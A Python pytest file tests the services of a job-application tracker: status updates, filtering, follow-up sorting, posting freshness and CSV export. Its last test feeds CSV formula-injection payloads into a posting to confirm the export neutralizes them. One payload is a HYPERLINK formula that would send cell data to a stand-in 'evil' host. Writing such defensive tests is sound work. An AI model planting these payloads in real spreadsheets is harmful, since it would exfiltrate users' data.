from datetime import date, datetime, timedelta, timezone

import pytest
from sqlalchemy.orm import Session

from app.db import engine
from app.schemas.application import ApplicationOut
from app.services.applications import (
    get_application_for_posting,
    get_or_create_application,
    list_applications,
    update_application_status,
)
from app.services.postings import capture_posting
from app.services.profile import create_profile_version

EMPTY_SNAPSHOT = {
    "experience": [],
    "projects": [],
    "skills": {"core": [], "developing": [], "coursework": []},
    "credentials": {"education": [], "oss_contributions": [], "publications": []},
    "criteria": {
        "skip_patterns": [],
        "target_signals": [],
        "location_prefs": {},
        "seniority_floor": None,
        "seniority_ceiling": None,
    },
}


@pytest.fixture
def db():
    connection = engine.connect()
    transaction = connection.begin()
    session = Session(bind=connection)
    create_profile_version(session, snapshot=EMPTY_SNAPSHOT)
    yield session
    session.close()
    transaction.rollback()
    connection.close()


def _capture(db, name, url):
    posting, _ = capture_posting(
        db, company_name=name, title="ML Engineer", raw_jd_text="build models", url=url
    )
    return posting


def test_update_application_status_creates_when_none_exists(db):
    posting = _capture(db, "AppCo1", "https://appco1.example.com/1")
    application = update_application_status(db, posting.id, "saved")
    assert application.posting_id == posting.id
    assert application.status == "saved"


def test_update_application_status_updates_existing_not_duplicate(db):
    posting = _capture(db, "AppCo2", "https://appco2.example.com/1")
    a1 = update_application_status(db, posting.id, "saved")
    a2 = update_application_status(db, posting.id, "applied")
    assert a1.id == a2.id
    assert a2.status == "applied"
    # Scoped to this posting, not a whole-table count -- the real dev DB
    # already has other application rows from live verification.
    matches = [a for a in list_applications(db) if a.posting_id == posting.id]
    assert len(matches) == 1


def test_update_application_status_partial_update_preserves_prior_fields(db):
    posting = _capture(db, "AppCo3", "https://appco3.example.com/1")
    update_application_status(
        db, posting.id, "applied", notes="applied via referral", resume_used="ml_search.tex"
    )
    updated = update_application_status(db, posting.id, "screening")  # no notes/resume_used passed
    assert updated.notes == "applied via referral"
    assert updated.resume_used == "ml_search.tex"
    assert updated.status == "screening"


def test_list_applications_filters_by_status(db):
    p1 = _capture(db, "AppCo4", "https://appco4.example.com/1")
    p2 = _capture(db, "AppCo5", "https://appco5.example.com/1")
    update_application_status(db, p1.id, "applied")
    update_application_status(db, p2.id, "rejected")
    applied_posting_ids = {a.posting_id for a in list_applications(db, status="applied")}
    rejected_posting_ids = {a.posting_id for a in list_applications(db, status="rejected")}
    assert p1.id in applied_posting_ids
    assert p1.id not in rejected_posting_ids
    assert p2.id in rejected_posting_ids
    assert p2.id not in applied_posting_ids


def test_get_or_create_application_returns_same_row_on_repeat_calls(db):
    posting = _capture(db, "AppCo6", "https://appco6.example.com/1")
    a1 = get_or_create_application(db, posting.id)
    a2 = get_or_create_application(db, posting.id)
    assert a1.id == a2.id
    assert a1.status is None


def test_get_application_for_posting_returns_none_without_creating_a_row(db):
    posting = _capture(db, "AppCo7", "https://appco7.example.com/1")
    assert get_application_for_posting(db, posting.id) is None
    # Confirm the read above was truly side-effect-free -- get_or_create
    # would still report "no prior status" either way, but only a genuinely
    # absent row proves nothing was inserted by the read.
    assert get_or_create_application(db, posting.id).status is None


def test_get_application_for_posting_returns_existing_row(db):
    posting = _capture(db, "AppCo8", "https://appco8.example.com/1")
    update_application_status(db, posting.id, "applied")
    application = get_application_for_posting(db, posting.id)
    assert application is not None
    assert application.status == "applied"


def test_update_application_status_auto_sets_date_applied(db):
    posting = _capture(db, "AppCo9", "https://appco9.example.com/1")
    application = update_application_status(db, posting.id, "applied")
    assert application.date_applied == date.today()


def test_update_application_status_does_not_clobber_existing_date_applied(db):
    posting = _capture(db, "AppCo10", "https://appco10.example.com/1")
    explicit_date = date(2026, 1, 5)
    update_application_status(db, posting.id, "applied", date_applied=explicit_date)
    # A later status change back to applied (no date_applied passed) must
    # not silently overwrite the real applied date with today.
    updated = update_application_status(db, posting.id, "screening")
    updated = update_application_status(db, posting.id, "applied")
    assert updated.date_applied == explicit_date


def test_update_application_status_does_not_auto_set_for_other_statuses(db):
    posting = _capture(db, "AppCo11", "https://appco11.example.com/1")
    application = update_application_status(db, posting.id, "saved")
    assert application.date_applied is None


def test_list_applications_sort_follow_up_orders_soonest_first_nulls_last(db):
    p1 = _capture(db, "AppCo12", "https://appco12.example.com/1")
    p2 = _capture(db, "AppCo13", "https://appco13.example.com/1")
    p3 = _capture(db, "AppCo14", "https://appco14.example.com/1")
    today = date.today()
    update_application_status(db, p1.id, "saved", follow_up_date=today + timedelta(days=10))
    update_application_status(db, p2.id, "saved", follow_up_date=today + timedelta(days=2))
    update_application_status(db, p3.id, "saved")  # no follow_up_date -- should sort last

    ordered_posting_ids = [
        a.posting_id
        for a in list_applications(db, sort="follow_up")
        if a.posting_id in {p1.id, p2.id, p3.id}
    ]
    assert ordered_posting_ids == [p2.id, p1.id, p3.id]


def test_application_out_reports_closed_posting_freshness(db):
    posting = _capture(db, "AppCo15", "https://appco15.example.com/1")
    posting.closed_at = datetime.now(timezone.utc)
    db.flush()
    application = update_application_status(db, posting.id, "saved")
    db.refresh(application)
    out = ApplicationOut.from_application(application)
    assert out.posting_freshness == "closed"


def test_export_csv_neutralizes_formula_cells(db):
    import csv
    import io

    from app.routers.applications import export_applications_csv

    posting, _ = capture_posting(
        db,
        company_name="@evil",
        title='=HYPERLINK("http://evil/?"&A1,"x")',
        raw_jd_text="build models",
        url="https://example.com/job",
    )
    update_application_status(db, posting.id, "applied", resume_used="+cmd", notes="\t-1+1")
    response = export_applications_csv(db=db)
    rows = list(csv.reader(io.StringIO(response.body.decode())))
    assert rows[1][0] == '\'=HYPERLINK("http://evil/?"&A1,"x")'
    assert rows[1][1] == "'@evil"
    assert rows[1][4] == "'+cmd"
    assert rows[1][7] == "'\t-1+1"
    assert rows[1][3] == "applied"
